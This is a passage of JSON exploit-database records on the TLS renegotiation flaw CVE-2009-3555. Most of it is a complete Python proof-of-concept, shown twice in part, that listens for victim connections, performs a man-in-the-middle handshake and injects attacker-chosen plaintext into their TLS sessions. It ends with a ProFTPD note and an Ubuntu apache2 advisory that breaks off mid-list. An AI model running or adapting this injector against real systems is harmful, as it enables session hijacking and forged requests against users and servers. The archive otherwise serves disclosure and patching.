renegotiating')\r\n\r\n    (options, args) = parser.parse_args()\r\n\r\n    if len([i for i in (options.inject, options.inject_file, options.inject_base64) if i]) != 1:\r\n        print 'Exactly one injection option must be specified'\r\n        sys.exit(1)\r\n\r\n    if options.inject_file:\r\n        try:\r\n            options.inject = open(options.inject_file, 'r').read()\r\n        except IOError, ex:\r\n            print ex\r\n            sys.exit(1)\r\n\r\n    if options.inject_base64:\r\n        import base64\r\n        try:\r\n            options.inject = base64.decodestring(options.inject_base64)\r\n        except base64.binascii.Error, ex:\r\n            print 'Error decoding base64 data: %s' % ex\r\n            sys.exit(1)\r\n\r\n\r\n    if not options.listen_port or \\\r\n       not options.bind_address or \\\r\n       not options.target or \\\r\n       not options.inject:\r\n        parser.print_help()\r\n        sys.exit(1)\r\n\r\n    target = options.target.split(':')\r\n    if len(target)==2:\r\n        try:\r\n            target[1] = int(target[1])\r\n        except ValueError:\r\n            target[1] = None\r\n    if len(target)!=2 or not target[0] or not target[1]:\r\n        print 'Target \\'%s\\' not in format HOST:PORT' % options.target\r\n        sys.exit(1)\r\n\r\n    options.target = tuple(target)\r\n\r\n    try:\r\n        listensocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        listensocket.bind((options.bind_address, options.listen_port))\r\n        print 'Listening on %s:%u' % (options.bind_address, options.listen_port)\r\n    except socket.error, ex:\r\n        print 'Couldn\\'t listen on %s:%u' % (options.bind_address, options.listen_port)\r\n        print 'Error code %u, \\'%s\\'' % (ex[0], ex[1])\r\n        sys.exit(1)\r\n\r\n    listensocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n    listensocket.listen(5)\r\n\r\n    mitmcount = 0\r\n\r\n    while True:\r\n        try:\r\n            victim, victimaddr = listensocket.accept()\r\n            print 'New connection from %s:%u' % victimaddr\r\n\r\n            threading.Thread(target=handle_victim, args=(victim, options, mitmcount)).start()\r\n            mitmcount += 1\r\n\r\n        except KeyboardInterrupt, ex:\r\n            print '\\nAborted by user, exiting...'\r\n            listensocket.close()\r\n            sys.exit(1)\r\n\r\n\n                              ",
            "cvss": {
                "score": 5.8,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:18637"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2009-12-21T00:00:00",
            "published": "2009-12-21T00:00:00",
            "href": "https://packetstormsecurity.com/files/84112/TLS-Renegotiation-Exploit.html",
            "id": "PACKETSTORM:84112",
            "type": "packetstorm",
            "title": "TLS Renegotiation Exploit",
            "sourceData": "`#!/usr/bin/env python  \n  \n######################################  \n# #  \n# RedTeam Pentesting GmbH #  \n# kontakt@redteam-pentesting.de #  \n# http://www.redteam-pentesting.de #  \n# #  \n######################################  \n  \n# PoC exploit for the TLS renegotiation vulnerability (CVE-2009-3555)  \n  \n# License  \n# -------  \n# CC-BY-SA http://creativecommons.org/licenses/by-sa/3.0/  \n  \n# Timeline  \n# --------  \n# 2009-12-21 initial public release  \n  \n# Known Issues  \n# ------------  \n# Firefox: if it fails connecting to a TLS site too often, falls back to  \n# issuing SSLv2 ClientHello only until browser is restarted  \n#  \n# wget: attempts SSLv2 ClientHello by default  \n  \n# References  \n# ----------  \n# http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3555  \n# http://www.phonefactor.com/sslgap  \n# http://www.extendedsubset.com/  \n# http://www.g-sec.lu/practicaltls.pdf  \n# http://tools.ietf.org/html/draft-ietf-tls-renegotiation-01  \n  \nimport tlslite  \nimport tlslite.api  \nimport tlslite.messages  \nimport tlslite.constants  \nimport struct  \nimport socket  \nimport threading  \nimport array  \nimport sys  \nimport optparse  \n  \n  \nif not hasattr(threading.Thread, 'name'):  \n# emulate python 2.6 threading module for earlier versions  \nthreading.current_thread = threading.currentThread  \nsetattr(threading.Thread, 'name',  \nproperty(threading.Thread.getName, threading.Thread.setName))  \n  \ndef forward(sock1, sock2):  \nsock1.settimeout(1.0)  \nwhile True:  \ntry:  \ndata = sock1.recv(4096)  \nif not data:  \nreturn  \nsock2.send(data)  \nexcept socket.error, ex_error:  \nif ex_error[0] == 104: # Connection reset by peer  \nreturn  \nexcept socket.timeout, ex_timeout:  \npass  \n  \n  \nclass MessageWrapper(object):  \ndef __init__(self, version = (3, 1), ssl2 = False):  \nself.contentType = tlslite.messages.ContentType.handshake  \nself.ssl2 = ssl2  \nself.client_version = version  \n  \ndef setType(self, type):  \nself.contentType = type  \n  \ndef addBytes(self, bytes):  \nself.bytes = bytes  \n  \ndef write(self, trial=False):  \nif trial:  \nraise Exception('Unsupported')  \nreturn array.array('B', self.bytes)  \n  \ndef send_record(sock, msg_type, version_major, version_minor, record):  \nmsg = struct.pack('!BBBH', msg_type, version_major, version_minor, len(record))  \nif type(record) != str:  \nmsg += record.tostring()  \nelse:  \nmsg += record  \nsock.send(msg)  \n  \ndef send_encapsulated(sslsock, type, messagebytes, version = (3, 1)):  \nmsg = MessageWrapper(version)  \nmsg.addBytes(struct.unpack('B'*len(messagebytes), messagebytes))  \nmsg.setType(type)  \nfor dummy in sslsock._sendMsg(msg, True):  \npass  \n  \ndef decrypt_record(sslsock, type, recordbytes):  \nfor result in sslsock._decryptRecord(type, array.array('B', recordbytes)):  \npass  \nreturn result  \n  \ndef recv_record(sock):  \ntry:  \nheader = sock.recv(5)  \nif not header:  \nreturn None, None, None, None  \nmsg_type, msg_version_major, msg_version_minor, msg_length = struct.unpack('!BBBH', header)  \nrecord = ''  \nwhile len(record) != msg_length:  \nrecord += sock.recv(msg_length - len(record))  \nreturn msg_type, msg_version_major, msg_version_minor, record  \nexcept socket.error, ex:  \nif ex[0] == 104: # Connection reset by peer  \nreturn  \n  \ndef recv_clienthello(sock):  \nheader_bytes = []  \nheader_bytes.append(sock.recv(1))  \nheader_bytes[0] = struct.unpack('!B', header_bytes[0])[0]  \nif header_bytes[0] & 0x80:  \n# Version 2.0 Client \"Record Layer\"  \nheader_bytes.append(sock.recv(1))  \nheader_bytes[1] = struct.unpack('!B', header_bytes[1])[0]  \nmsg_length = (header_bytes[0] & 0x7f) << 8 | header_bytes[1]  \nmsg_version_major = 2  \nmsg_version_minor = 0  \nmsg_type = tlslite.constants.ContentType.handshake  \nrecord = sock.recv(msg_length)  \nelse:  \nheader = sock.recv(4)  \nmsg_type = header_bytes[0]  \nmsg_version_major, msg_version_minor, msg_length = struct.unpack('!BBH', header)  \nrecord = sock.recv(msg_length)  \n  \nreturn msg_type, msg_version_major, msg_version_minor, record  \n  \ndef send_hello_request(sock):  \nsock.send(\"\\x16\" # Record Layer: Handshake Message  \n+\"\\x03\\x01\" # Record Layer Version: TLS 1.0  \n+\"\\x00\\x04\" # Record Layer Length: 4  \n+\"\\x00\" # Handshake Message Type: Hello Request  \n+\"\\x00\\x00\\x00\") # Handshake Message Length: 0  \n  \ndef send_protocol_version_alert(sock):  \nsock.send(\"\\x15\" # Record Layer: Alert\"  \n+\"\\x03\\x01\" # Record Layer Version: TLS 1.0  \n+\"\\x00\\x02\" # Record Layer Length: 2  \n+\"\\x00\" # Alert Message: fatal  \n+\"\\x46\") # Alert Message: protocol version  \n  \n  \ndef handle_victim(victim, options, mitmcount):  \n  \nif options.one_shot and mitmcount != 0:  \nprint threading.current_thread().name, '--one-shot specified and initial connection already handled, forwarding only'  \nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  \ntry:  \nsock.connect(options.target)  \nprint threading.current_thread().name, 'Connected to target %s:%u' % options.target  \nexcept socket.error, ex:  \nprint threading.current_thread().name, 'Couldn\\'t connect to target %s:%u' % options.target  \nprint threading.current_thread().name, 'Error code %u, \\'%s\\'' % (ex[0], ex[1])  \nsys.exit(1)  \n  \nt1 = threading.Thread(target=forward, args=(sock, victim))  \nt1.start()  \n  \nt2 = threading.Thread(target=forward, args=(victim, sock))  \nt2.start()  \n  \nt1.join()  \nsock.close()  \n  \nt2.join()  \nvictim.close()  \nreturn  \n  \n# obtain initial \"client hello\" message  \nmsg_type, msg_version_major, msg_version_minor, hello_msg = recv_clienthello(victim)  \nif msg_version_major == 2:  \nprint threading.current_thread().name, \"client sent SSLv2 client hello message, exiting thread\"  \nreturn  \n  \ntls_version = (msg_version_major, msg_version_minor)  \ntype, length, version_major, version_minor, random, session_id_length = struct.unpack('!B3sBB32sB', hello_msg[:39])  \nresume_session = (session_id_length != 0)  \nif resume_session:  \nprint threading.current_thread().name, \"client attempting to resume session\"  \n  \nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  \ntry:  \nsock.connect(options.target)  \nprint threading.current_thread().name, 'Connected to target %s:%u' % options.target  \nexcept socket.error, ex:  \nprint threading.current_thread().name, 'Couldn\\'t connect to target %s:%u' % options.target  \nprint threading.current_thread().name, 'Error code %u, \\'%s\\'' % (ex[0], ex[1])  \nsys.exit(1)  \n  \n  \nsslsock = tlslite.api.TLSConnection(sock)  \nhandshake_settings = tlslite.HandshakeSettings.HandshakeSettings()  \nhandshake_settings.minVersion = tls_version  \nhandshake_settings.maxVersion = tls_version  \nsslsock.handshakeClientCert(settings = handshake_settings)  \n  \n# inject prefix  \nsslsock.write(options.inject)  \nprint threading.current_thread().name, 'Injected %s' % repr(options.inject)  \n  \n# send original \"client hello\" message over the encrypted channel  \nsend_encapsulated(sslsock, 22, hello_msg, tls_version)  \n  \n# now receive serveral TLS messages from the server, decrypt them, and forward  \n# them to the client, until the server sends \"server hello done\"  \n# these messages include \"server hello\", \"certificate\", \"server key exchange\",  \n# unless the client is trying to resume a previous session  \nprint threading.current_thread().name, \"about to receive server handshake messages\"  \nserver_handshake_done = False  \nwhile not server_handshake_done:  \nmsg_type, msg_version_major, msg_version_minor, result = recv_record(sslsock.sock)  \nif result:  \nresult = decrypt_record(sslsock, msg_type, result)  \nsend_record(victim, msg_type, msg_version_major, msg_version_minor, result)  \nif result[0] == 0x0e: # server hello done - should terminate handshake  \nserver_handshake_done = True  \nelif resume_session and msg_type == 0x14: # change cipher spec - probably irrelevant  \nserver_handshake_done = True  \nelse:  \nprint threading.current_thread().name, 'receive from server failed, exiting thread'  \nreturn  \nprint threading.current_thread().name, \"server handshake done\"  \n  \n  \n# now its the the client's turn to send some messages, e.g.  \n# \"client key exchange\" and \"change cipher spec\"  \nprint threading.current_thread().name, \"about to receive client handshake messages\"  \nhandshake_finished = False  \nwhile not handshake_finished:  \nmsg_type, msg_version_major, msg_version_minor, record = recv_record(victim)  \nprint threading.current_thread().name, msg_type  \nsend_encapsulated(sslsock, msg_type, record, tls_version)  \nif msg_type == 0x14: # change cipher spec  \nhandshake_finished = True  \n  \nprint threading.current_thread().name, \"client handshake done\"  \n  \n# message after \"change cipher spec\" must be sent in the \"clear\"  \nmsg_type, msg_version_major, msg_version_minor, record = recv_record(victim)  \nsend_record(sslsock.sock, msg_type, msg_version_major, msg_version_minor, record)  \n  \n# server should now send \"change cipher spec\" message, we decrypt and send that to the victim  \nmsg_type, msg_version_major, msg_version_minor, record = recv_record(sslsock.sock)  \nresult = decrypt_record(sslsock, msg_type, record)  \nsend_record(victim, msg_type, msg_version_major, msg_version_minor, result)  \n  \n# finalize handshake  \nmsg_type, msg_version_major, msg_version_minor, record = recv_record(sslsock.sock)  \nif record:  \nsend_record(victim, msg_type, msg_version_major, msg_version_minor, record)  \nelse:  \nsslsock.sock.close()  \nvictim.close()  \ndel sslsock  \nreturn  \n  \n  \n  \n# the rest is just forwarding TLS records between both parties,  \n# which we cannot interfere with anymore, apart from dropping server  \n# responses  \nif options.drop:  \nsslsock.sock.close()  \ndel sslsock  \nelse:  \nt1 = threading.Thread(target=forward, args=(sslsock.sock, victim))  \nt1.start()  \n  \nt2 = threading.Thread(target=forward, args=(victim, sslsock.sock))  \nt2.start()  \n  \nif not options.drop:  \nt1.join()  \nsslsock.sock.close()  \n  \nt2.join()  \nvictim.close()  \n  \n  \n  \nif __name__ == \"__main__\":  \nparser = optparse.OptionParser()  \nparser.add_option('-l', '--listen', dest='listen_port', help='port to listen on', metavar='PORT', type='int', default=8443)  \nparser.add_option('-b', '--bind', dest='bind_address', help='address to bind to', metavar='ADDRESS', default='0.0.0.0')  \nparser.add_option('-t', '--target', dest='target', help='host and port to connect to', metavar='HOST:PORT' )  \nparser.add_option('-i', '--inject', dest='inject', help='string to inject', metavar='DATA')  \nparser.add_option('', '--inject-file', dest='inject_file', help='inject data from a file', metavar='FILE')  \nparser.add_option('', '--inject-base64', dest='inject_base64', help='string to inject, base64-encoded', metavar='DATA')  \nparser.add_option('-o', '--one-shot', dest='one_shot', action='store_true', help='only mitm the first connection attempt, forward all other connections')  \nparser.add_option('-d', '--drop-responses', dest='drop', action=\"store_true\", default=False, help='drop server responses after renegotiating')  \n  \n(options, args) = parser.parse_args()  \n  \nif len([i for i in (options.inject, options.inject_file, options.inject_base64) if i]) != 1:  \nprint 'Exactly one injection option must be specified'  \nsys.exit(1)  \n  \nif options.inject_file:  \ntry:  \noptions.inject = open(options.inject_file, 'r').read()  \nexcept IOError, ex:  \nprint ex  \nsys.exit(1)  \n  \nif options.inject_base64:  \nimport base64  \ntry:  \noptions.inject = base64.decodestring(options.inject_base64)  \nexcept base64.binascii.Error, ex:  \nprint 'Error decoding base64 data: %s' % ex  \nsys.exit(1)  \n  \n  \nif not options.listen_port or \\  \nnot options.bind_address or \\  \nnot options.target or \\  \nnot options.inject:  \nparser.print_help()  \nsys.exit(1)  \n  \ntarget = options.target.split(':')  \nif len(target)==2:  \ntry:  \ntarget[1] = int(target[1])  \nexcept ValueError:  \ntarget[1] = None  \nif len(target)!=2 or not target[0] or not target[1]:  \nprint 'Target \\'%s\\' not in format HOST:PORT' % options.target  \nsys.exit(1)  \n  \noptions.target = tuple(target)  \n  \ntry:  \nlistensocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  \nlistensocket.bind((options.bind_address, options.listen_port))  \nprint 'Listening on %s:%u' % (options.bind_address, options.listen_port)  \nexcept socket.error, ex:  \nprint 'Couldn\\'t listen on %s:%u' % (options.bind_address, options.listen_port)  \nprint 'Error code %u, \\'%s\\'' % (ex[0], ex[1])  \nsys.exit(1)  \n  \nlistensocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  \nlistensocket.listen(5)  \n  \nmitmcount = 0  \n  \nwhile True:  \ntry:  \nvictim, victimaddr = listensocket.accept()  \nprint 'New connection from %s:%u' % victimaddr  \n  \nthreading.Thread(target=handle_victim, args=(victim, options, mitmcount)).start()  \nmitmcount += 1  \n  \nexcept KeyboardInterrupt, ex:  \nprint '\\nAborted by user, exiting...'  \nlistensocket.close()  \nsys.exit(1)  \n  \n  \n`\n",
            "cvss": {
                "score": 5.8,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:84112"
        },
        {
            "bulletinFamily": "exploit",
            "description": "CVE ID: CVE-2009-3555\r\n\r\nProFTPD\u662f\u4e00\u6b3e\u5f00\u653e\u6e90\u4ee3\u7801FTP\u670d\u52a1\u7a0b\u5e8f\u3002\r\n\r\nProFTPD\u7684\u6a21\u5757mod_tls\u5b58\u5728OpenSSL\u7684\u4f1a\u8bdd\u53ef\u91cd\u65b0\u534f\u5546\u9009\u9879\u7684\u6f0f\u6d1e\uff0c\u5bfc\u81f4\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u4f1a\u8bdd\u6570\u636e\u6d41\u4e2d\u63d2\u5165\u660e\u6587\u6570\u636e\uff0c\u64cd\u7eb5\u6570\u636e\u4ea4\u4e92\u3002\n\nProFTPD Project ProFTPD 1.3.x\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nProFTPD Project\r\n---------------\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://www.proftpd.org/docs/RELEASE_NOTES-1.3.2c",
            "modified": "2009-12-15T00:00:00",
            "published": "2009-12-15T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-15088",
            "id": "SSV:15088",
            "type": "seebug",
            "title": "ProFTPD TLS\u4f1a\u8bdd\u91cd\u534f\u5546\u660e\u6587\u6570\u636e\u6ce8\u5165\u6f0f\u6d1e",
            "sourceData": "",
            "cvss": {
                "score": 5.8,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:15088"
        },
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2009-11-20T00:00:00",
            "published": "2009-11-20T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-12673",
            "id": "SSV:12673",
            "type": "seebug",
            "title": "apache2 vulnerabilities",
            "sourceData": "\n                                                ===========================================================\r\nUbuntu Security Notice USN-860-1          November 19, 2009\r\napache2 vulnerabilities\r\nCVE-2009-3094, CVE-2009-3095, CVE-2009-3555\r\n===========================================================\r\n\r\nA security issue affects the following Ubuntu releases:\r\n\r\nUbuntu 6.06 LTS\r\nUbuntu 8.04 LTS\r\nUbuntu 8.10\r\nUbuntu 9.04\r\nUbuntu 9.10\r\n\r\nThis advisory also applies to the corresponding versions of\r\nKubuntu, Edubuntu, and Xubuntu.\r\n\r\nThe problem can be corrected by upgrading your system to the\r\nfollowing package versions:\r\n\r\nUbuntu 6.06 LTS:\r\n  apache2-common                  2.0.55-4ubuntu2.9\r\n\r\nUbuntu 8.04 LTS:\r\n  apache2.2-common                2.2.8-1ubuntu0.14\r\n\r\nUbuntu 8.10:\r\n  apache2.2-common                2.2.9-7ubuntu3.5\r\n\r\nUbuntu 9.04:\r\n  apache2.2-common                2.2.11-2ubuntu2.5\r\n\r\nUbuntu 9.10:\r\n  apache2.2-common                2.2.12-1ubuntu2.1\r\n\r\nIn general, a standard system upgrade is sufficient to effect the\r\nnecessary changes.\r\n\r\nDetails follow:\r\n\r\nMarsh Ray and Steve Dispensa discovered a flaw in the TLS and SSLv3\r\nprotocols. If an attacker could perform a man in the middle attack at the\r\nstart of a TLS connection, the attacker could inject arbitrary content at\r\nthe beginning of the user's session. The flaw is with TLS renegotiation and\r\npotentially affects any software that supports this feature. Attacks\r\nagainst the HTTPS protocol are known, with the severity of the issue\r\ndepending on the safeguards used in the web application. Until the TLS\r\nprotocol and underlying libraries are adjusted to defend against this\r\nvulnerability, a partial, temporary workaround has been applied to Apache\r\nthat disables client initiated TLS renegotiation. This update does not\r\nprotect against server initiated TLS renegotiation when using\r\nSSLVerifyClient and SSLCipherSuite on a per Directory or Location basis.\r\nUsers can defend againt server inititiated TLS renegotiation attacks by\r\nadjusting their Apache configuration to use SSLVerifyClient and\r\nSSLCipherSuite only on the server or virtual host level. (CVE-2009-3555)\r\n\r\nIt was discovered that mod_proxy_ftp in Apache did not properly sanitize\r\nits input when processing replies to EPASV and PASV commands. An attacker\r\ncould use this to cause a denial of service in the Apache child process.\r\n(CVE-2009-3094)\r\n\r\nAnother flaw was discovered in mod_proxy_ftp. If Apache is configured as a\r\nreverse proxy, an attacker could send a crafted HTTP header to bypass\r\nintended access controls and send arbitrary commands to the FTP server.\r\n(CVE-2009-3095)\r\n\r\n\r\nUpdated packages for Ubuntu 6.06 LTS:\r\n\r\n  Source archives:\r\n\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2_2.0.55-4ubuntu2.9.di \\\r\nff.gz  Size/MD5:   130638 5d172b0ca228238e211940fad6b0935d\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2_2.0.55-4ubuntu2.9.ds \\\r\nc  Size/MD5:     1156 a6d575c4c0ef0ef9c4c77e7f6ddfb02d\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2_2.0.55.orig.tar.gz\r\n      Size/MD5:  6092031 45e32c9432a8e3cf4227f5af91b03622\r\n\r\n  Architecture independent packages:\r\n\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-doc_2.0.55-4ubuntu2. \\\r\n9_all.deb  Size/MD5:  2125884 643115e9135b9bf626f3a65cfc5f2ed3\r\n\r\n  amd64 architecture (Athlon64, Opteron, EM64T Xeon):\r\n\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-common_2.0.55-4ubunt \\\r\nu2.9_amd64.deb  Size/MD5:   834492 818915da9848657833480b1ead6b4a12\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-perchild_2.0.55- \\\r\n4ubuntu2.9_amd64.deb  Size/MD5:   229578 9086ac3033e0425ecd150b31b377ee76\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-prefork_2.0.55-4 \\\r\nubuntu2.9_amd64.deb  Size/MD5:   224594 85a4480344a072868758c466f6a98747\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-worker_2.0.55-4u \\\r\nbuntu2.9_amd64.deb  Size/MD5:   229128 446b52088b9744fb776e53155403a474\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-prefork-dev_2.0.55-4 \\\r\nubuntu2.9_amd64.deb  Size/MD5:   172850 17e4cd95ecb9d0390274fca9625c2e5e\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-threaded-dev_2.0.55- \\\r\n4ubuntu2.9_amd64.deb  Size/MD5:   173636 b501407d01fa07e5807c28cd1db16cd7\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-utils_2.0.55-4ubuntu \\\r\n2.9_amd64.deb  Size/MD5:    95454 a06ee30ec14b35003ebcb821624bc2af\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2_2.0.55-4ubuntu2.9_am \\\r\nd64.deb  Size/MD5:    37510 4c063b1b8d831ea8a02d5ec691995dec\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/libapr0-dev_2.0.55-4ubuntu2. \\\r\n9_amd64.deb  Size/MD5:   287048 9cdc7502ebc526d4bc7df9b59a9d8925\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/libapr0_2.0.55-4ubuntu2.9_am \\\r\nd64.deb  Size/MD5:   145624 4b613a57da2ca57678e8c8f0c1628556\r\n\r\n  i386 architecture (x86 compatible Intel/AMD):\r\n\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-common_2.0.55-4ubunt \\\r\nu2.9_i386.deb  Size/MD5:   787870 67b1855dc984e5296ac9580e2a2f0a0c\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-perchild_2.0.55- \\\r\n4ubuntu2.9_i386.deb  Size/MD5:   204122 edf40b0ff5c1824b2d6232da247ce480\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-prefork_2.0.55-4 \\\r\nubuntu2.9_i386.deb  Size/MD5:   200060 6267a56fcef78f6300372810ce36ea41\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-worker_2.0.55-4u \\\r\nbuntu2.9_i386.deb  Size/MD5:   203580 c487929bbf45b5a4dc3d035d86f7b3a0\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-prefork-dev_2.0.55-4 \\\r\nubuntu2.9_i386.deb  Size/MD5:   172876 bae257127c3d137e407a7db744f3d57a\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-threaded-dev_2.0.55- \\\r\n4ubuntu2.9_i386.deb  Size/MD5:   173660 9dd0e108ab4d3382799b29d901bf4502\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-utils_2.0.55-4ubuntu \\\r\n2.9_i386.deb  Size/MD5:    93410 d5d602c75a28873f1cd7523857e0dd80\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2_2.0.55-4ubuntu2.9_i3 \\\r\n86.deb  Size/MD5:    37508 22049e1ea8ea88259ff3f6e94482cfb3\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/libapr0-dev_2.0.55-4ubuntu2. \\\r\n9_i386.deb  Size/MD5:   263066 43fa2ae3b43c4743c98c45ac22fb0250\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/libapr0_2.0.55-4ubuntu2.9_i3 \\\r\n86.deb  Size/MD5:   133484 e70b7f81859cb92e0c50084e92216526\r\n\r\n  powerpc architecture (Apple Macintosh G3/G4/G5):\r\n\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-common_2.0.55-4ubunt \\\r\nu2.9_powerpc.deb  Size/MD5:   860622 6d386da8da90d363414846dbc7fa7f08\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-perchild_2.0.55- \\\r\n4ubuntu2.9_powerpc.deb  Size/MD5:   221470 8c207b379f7ba646c94759d3e9079dd4\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-prefork_2.0.55-4 \\\r\nubuntu2.9_powerpc.deb  Size/MD5:   217132 069cab77278b101c3c4a5b172f36ba9b\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-worker_2.0.55-4u \\\r\nbuntu2.9_powerpc.deb  Size/MD5:   220968 2f6ba65769fc964eb6dfec8a842f7621\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-prefork-dev_2.0.55-4 \\\r\nubuntu2.9_powerpc.deb  Size/MD5:   172874 89137c84b5a33f526daf3f8b4c047a7e\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-threaded-dev_2.0.55- \\\r\n4ubuntu2.9_powerpc.deb  Size/MD5:   173662 23e576721faccb4aef732cf98e2358d4\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-utils_2.0.55-4ubuntu \\\r\n2.9_powerpc.deb  Size/MD5:   105198 44f9e698567784555db7d7d971b9fce2\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2_2.0.55-4ubuntu2.9_po \\\r\nwerpc.deb  Size/MD5:    37518 fe7caa2a3cf6d4227ac34692de30635e\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/libapr0-dev_2.0.55-4ubuntu2. \\\r\n9_powerpc.deb  Size/MD5:   282644 ec0306c04778cf8c8edd622aabb0363c\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/libapr0_2.0.55-4ubuntu2.9_po \\\r\nwerpc.deb  Size/MD5:   142730 d43356422176ca29440f3e0572678093\r\n\r\n  sparc architecture (Sun SPARC/UltraSPARC):\r\n\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-common_2.0.55-4ubunt \\\r\nu2.9_sparc.deb  Size/MD5:   805078 0f1f6a9b04ad5ce4ea29fd0e44bf18a4\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-perchild_2.0.55- \\\r\n4ubuntu2.9_sparc.deb  Size/MD5:   211674 eb19532b9b759c806e9a95a4ffbfad9b\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-prefork_2.0.55-4 \\\r\nubuntu2.9_sparc.deb  Size/MD5:   207344 9e5770a4c94cbc4f9bc8cc11a6a038f1\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-worker_2.0.55-4u \\\r\nbuntu2.9_sparc.deb  Size/MD5:   210948 6d1d2357cec5b88c1c2269e5c16724bc\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-prefork-dev_2.0.55-4 \\\r\nubuntu2.9_sparc.deb  Size/MD5:   172882 d04dd123def1bc4cfbf2ac0095432eea\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-threaded-dev_2.0.55- \\\r\n4ubuntu2.9_sparc.deb  Size/MD5:   173662 6be46bbb9e92224020da49d657cb4cd4\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-utils_2.0.55-4ubuntu \\\r\n2.9_sparc.deb  Size/MD5:    94510 9df6ae07a9218d6159b1eebde5d58606\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2_2.0.55-4ubuntu2.9_sp \\\r\narc.deb  Size/MD5:    37506 89856bb1433e67fb23c8d34423d3e0a5\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/libapr0-dev_2.0.55-4ubuntu2. \\\r\n9_sparc.deb  Size/MD5:   269070 bf585dec777b0306cd80663c11b020df\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/libapr0_2.0.55-4ubuntu2.9_sp \\\r\narc.deb  Size/MD5:   131466 340eaf2d2c1f129c7676a152776cfcf3\r\n\r\nUpdated packages for Ubuntu 8.04 LTS:\r\n\r\n  Source archives:\r\n\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2_2.2.8-1ubuntu0.14.di \\\r\nff.gz  Size/MD5:   141838 37d5c93b425758839cbef5afea5353a2\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2_2.2.8-1ubuntu0.14.ds \\\r\nc  Size/MD5:     1381 78c9a13cc2af0dbf3958a3fc98aeea84\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2_2.2.8.orig.tar.gz\r\n      Size/MD5:  6125771 39a755eb0f584c279336387b321e3dfc\r\n\r\n  Architecture independent packages:\r\n\r\n    